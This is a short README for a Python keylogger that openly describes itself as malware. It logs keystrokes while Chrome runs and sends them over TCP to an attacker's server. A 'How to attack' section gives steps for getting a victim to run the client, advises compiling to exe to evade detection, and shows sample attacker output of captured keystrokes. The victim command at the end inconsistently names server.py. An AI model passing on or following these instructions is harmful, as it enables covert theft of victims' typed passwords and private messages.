# Chrome_keylogger
A keylogger that starts logging when chrome is running. This malware will send the keystrokes from a TCP client back to the malicious TCP server


# How to attack:
First of all, you can edit the code a bit and compile all the scripts into exe for less detection.

Follow these steps:
  1- The victim must run program.py, when the file is ran, the keylogger and the TCP Client will start too. \n
  2- The attacker must run server.py then bind his/her IP and port. \n
  3- You will start receiving everything the victim types. \n

# Deeper demonstration:
Attacker:\n
attacker@kali:~$ python3 server.py
    
    Output:
    IP: type_your_ip_here
    Port: 8080
    Client (client_ip) connected.
    
    2020-10-12 22:05:35,120: 'h'
    2020-10-12 22:05:35,390: 'i'
    2020-10-12 22:05:36,258: Key.space
    2020-10-12 22:05:36,631: 't'
    2020-10-12 22:05:36,806: 'h'
    2020-10-12 22:05:36,963: 'e'
    2020-10-12 22:05:37,080: 'r'
    2020-10-12 22:05:37,168: 'e'
Victim:

victim@kali:~$ python3 server.py    
